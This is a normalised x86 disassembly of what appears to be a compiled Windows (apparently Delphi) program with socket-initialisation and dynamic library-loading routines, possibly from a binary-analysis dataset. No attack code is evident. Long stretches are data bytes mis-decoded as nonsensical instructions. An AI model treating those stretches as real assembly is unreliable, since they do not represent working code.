add [ esi + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax + 0x640000fe ] dh
out 0x48 al
add [ ecx + 0x640000fe ] dh
out 0x48 al
add [ edx + 0x640000fe ] dh
out 0x48 al
add [ ebx + 0x640000fe ] dh
out 0x48 al
add [ esi + edi * 8 - 0x199c0000 ] dh
dec eax
add [ ebp + 0x640000fe ] dh
out 0x48 al
add [ esi + 0x640000fe ] dh
out 0x48 al
add [ edi + 0x640000fe ] dh
out 0x48 al
add [ eax + 0x640000fe ] bh
out 0x48 al
add [ ecx + 0x640000fe ] bh
out 0x48 al
add [ edx + 0x640000fe ] bh
out 0x48 al
add [ ebx + 0x640000fe ] bh
out 0x48 al
add [ esi + edi * 8 - 0x199c0000 ] bh
dec eax
add [ ebp + 0x640000fe ] bh
out 0x48 al
add [ esi + 0x640000fe ] bh
out 0x48 al
add [ edi + 0x640000fe ] bh
out 0x48 al
add [ eax + 0x640000fe ] ah
out 0x48 al
add [ ecx + 0x640000fe ] ah
out 0x48 al
add [ edx + 0x640000fe ] ah
out 0x48 al
add [ ebx + 0x640000fe ] ah
out 0x48 al
add [ esi + edi * 8 - 0x199c0000 ] ah
dec eax
add [ ebp + 0x640000fe ] ah
out 0x48 al
add [ esi + 0x640000fe ] ah
out 0x48 al
add [ edi + 0x640000fe ] ah
out 0x48 al
add [ eax + 0x640000fe ] ch
out 0x48 al
add [ ecx + 0x640000fe ] ch
out 0x48 al
add [ edx + 0x640000fe ] ch
out 0x48 al
add [ ebx + 0x640000fe ] ch
out 0x48 al
add [ esi + edi * 8 - 0x199c0000 ] ch
dec eax
add [ ebp + 0x640000fe ] ch
out 0x48 al
add [ esi + 0x640000fe ] ch
out 0x48 al
add [ edi + 0x640000fe ] ch
out 0x48 al
add [ eax + 0x640000fe ] dl
out 0x48 al
add [ ecx + 0x640000fe ] dl
out 0x48 al
add [ edx + 0x640000fe ] dl
out 0x48 al
add [ ebx + 0x640000fe ] dl
out 0x48 al
add [ esi + edi * 8 - 0x199c0000 ] dl
dec eax
add [ ebp + 0x640000fe ] dl
out 0x48 al
add [ esi + 0x550000fe ] dl
mov ebp esp
xor eax eax
push ebp
push sub_471865
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47186c
retn
sub_47187c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ eax ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
sbb [ edi ] al
sbb [ eax ] al
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
adc al 0x0
add [ eax ] al
cmovne ecx [ ecx + 0x64 ]
push edi
push ebx
xor dl [ ebx + 0x74 ]
jne r-xdata
inc eax
lea eax [ ebx + 0x10 ]
call sub_404100
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40442c
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40badc
inc ebp
jb r-xdata
hlt
outsd
jb r-xdata
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xe004032 ] ah
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sbb [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ficomp [ eax ]
inc edi
add [ eax ] bl
add [ eax ] al
add [ ecx + ecx + 0x47 ] cl
add al ah
xor al 0x40
rcl [ ebp - 0x75 ] 0xec
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_471990
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_404100
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b2d4
mov edx [ ebp - 0x8 ]
mov ecx edi
xor edx edx
mov eax ebx
call sub_40badc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471997
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040d0
retn
sub_4718f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_471990
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_404100
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b2d4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_404100
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40442c
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40badc
mov ecx edi
xor edx edx
mov eax ebx
call sub_40badc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471997
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040d0
retn
sub_471997
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_472774
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_472817
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47281e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408fe4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4718f0
call sub_403a64
sub_472828
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_47284c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_472919
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408fe4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4718f0
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472920
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_472957
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_472984
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47298b
retn
call sub_4719c8
sub_4729a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4729c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4729cc
retn
sub_4729d8
and al 0x2a
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] dh
inc edi
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x13ffbfce ] ah
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] dh
xor eax [ edi ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
jl r-xdata
imul esi [ ebx + 0x74 ] 0x2a90c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
sub eax [ edi ]
adc [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
and [ esi ] ch
inc edi
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc edi
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sub eax [ edi ]
or al 0x0
arpl [ ebx - 0x70 ] bp
jl r-xdata
mov al [ 0x17004032 ]
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
xor al 0x40
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x47 ] bh
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
inc ebp
dec ecx
push ebx
je r-xdata
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
xor [ ebx ] ch
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1c004032 ] ah
inc ebp
dec ecx
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ebx ]
inc edi
add [ eax + eax ] cl
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xd004032 ] ah
inc ebp
dec ecx
push ebx
je r-xdata
inc eax
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_472c68
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x4400408d
sub al 0x47
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x47 ] al
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx ] ch
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x17004032 ] ah
inc edi
outsd
jb r-xdata
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
rcr al 0x2b
sub_472c68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_472d1c
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_472cb0
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_472d0f
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472d16
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_472d1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472d6e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_471508
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472d75
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_472da8
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_4080e8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_473254
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404100
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_404100
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_472e20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_47321a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4040ac
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408fe4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473221
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
jmp [ eax * 4 + jump_table_472e60 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
sub_473228
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_408400
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_408400
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_473254
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_473313
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404144
mov eax [ ebp - 0x8 ]
call sub_473228
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_473228
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47331a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_4040d0
retn
mov eax [ ebp - 0x10 ]
call sub_473228
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_473228
test al al
jne r-xdata
mov bl 0x1
sub_473330
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_473360
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_4733a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4733af
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_4733b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4733dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4733e4
retn
sub_4733f0
cmp al 0x34
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x47 ] cl
add [ eax ] cl
add [ eax ] eax
add al bl
sub [ edi ] eax
loopne r-xdata
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x48004032 ] ah
inc ebx
inc edi
add al ah
inc edx
inc edi
add [ eax + 0x44004743 ] dh
inc ebx
inc edi
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] cl
inc edi
add [ edi + edi ] cl
inc edi
add [ edi + edi + 0x3c840047 ] dh
inc edi
add [ ebp + esi + 0x47 ] al
add al ah
inc edi
add [ eax + 0x37 ] dh
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
in al 0x38
inc edi
add [ eax + edi + 0x3ce40047 ] dl
inc edi
add ah ch
cmp eax 0x3ccc0047
inc edi
add [ eax ] ah
cmp [ edi ] eax
fdivr [ edi + eax * 2 ]
add ah dh
inc edi
add [ eax ] al
aas
inc edi
add [ ecx + edi ] ch
inc edi
add [ eax + 0x39 ] cl
inc edi
add ah al
cmp al [ edi ]
fdivr [ ebx ]
inc edi
add al bh
cmp eax [ edi ]
cmp al 0x47
add [ esp + edi + 0x41740047 ] dh
inc edi
add ah ah
inc ebx
inc edi
add [ eax - 0x7fffb8c4 ] ch
inc ecx
inc edi
add [ eax ] ah
inc edx
inc edi
add al al
inc edx
inc edi
add [ eax ] dh
inc edi
add [ eax + 0xf004740 ] bl
push esp
dec ecx
push ebx
je r-xdata
lea eax [ eax ]
mov al 0x34
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x100047 ] dh
add [ eax ] al
inc esp
sub al [ edi ]
loopne r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4735e2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_472d7c
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
inc edi
add ah bl
aaa
inc edi
add al ch
aaa
inc edi
add [ eax ] bh
cmp [ edi ] al
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4735e9
lea eax [ ebp - 0x194 ]
call sub_4040ac
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_47284c
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405e08
